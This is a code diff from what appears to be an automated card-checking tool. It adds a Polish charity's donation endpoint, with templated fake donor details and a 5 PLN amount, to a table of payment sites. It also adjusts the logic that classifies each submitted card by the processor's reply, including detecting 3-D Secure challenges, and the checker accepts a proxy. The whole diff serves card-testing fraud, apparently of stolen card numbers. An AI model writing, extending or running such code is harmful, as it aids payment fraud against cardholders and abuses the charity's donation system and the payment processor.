@@ -299,6 +299,28 @@ PAYU_SITES = {
             "locale": "pl",
         },
     },
+    "humandoc": {
+        "create_type": "ajax",
+        "create_url": "https://humandoc.pl/wp-json/v1/donations-form/submit",
+        "redirect_field": "redirectUri",
+        "referer": "https://humandoc.pl/przekaz-darowizne/",
+        "origin": "https://humandoc.pl",
+        "amount": "5",
+        "mcp_fx_table_id": 597551,
+        "mcp_fx_rate": 1,
+        "language": "pl",
+        "lang_param": "",
+        "country": "PL",
+        "timezone_offset": -60,
+        "donation_form": {
+            "name": "{first}",
+            "lastname": "{last}",
+            "email": "{email}",
+            "amount": "5.00",
+            "frequency": "once",
+            "payuCardToken": "",
+        },
+    },
 }
 
 # ── real device profiles (screen / color depth) ──────────────────────
@@ -599,7 +621,7 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
                          "Content-Type": "application/x-www-form-urlencoded",
                          "X-Requested-With": "XMLHttpRequest"})
             data = r.json()
-            redirect = data.get("href") or ""
+            redirect = data.get(cfg.get("redirect_field", "href")) or ""
         elif cfg["create_type"] == "utf":
             # two-step: donation form -> HTML with NewPayment form -> NewPayment -> redirect
             form = {k: v.format(first=first, last=last, email=email) for k, v in cfg["donation_form"].items()}
@@ -737,10 +759,14 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
                 auth_resp = r.json()
                 auth_status = (auth_resp.get("status") or "").upper()
                 three_ds = auth_resp.get("threeDsSupported")
+                form = auth_resp.get("form") or {}
+                challenge_url = (auth_resp.get("challengeUrl") or auth_resp.get("redirectUrl")
+                                or auth_resp.get("acsUrl") or form.get("actionUrl"))
                 # a real challenge (issuer ACS) can't be automated -> 3DS_REQUIRED
-                if three_ds and (auth_resp.get("challengeUrl") or auth_resp.get("redirectUrl") or auth_resp.get("acsUrl")):
+                if auth_status == "CHALLENGE_REQUIRED" or (three_ds and challenge_url):
                     return _finalize(card_entry, "CARD_3DS_REQUIRED", amount, currency)
-                if auth_status in ("FINISHED", "FAILED", "ERROR", "AUTHENTICATION_FAILED", "COMPLETED", "SUCCESS"):
+                if auth_status in ("FINISHED", "FAILED", "ERROR", "AUTHENTICATION_FAILED",
+                                   "AUTHENTICATION_SUCCESSFUL", "COMPLETED", "SUCCESS"):
                     break
                 await asyncio.sleep(1.0)
 
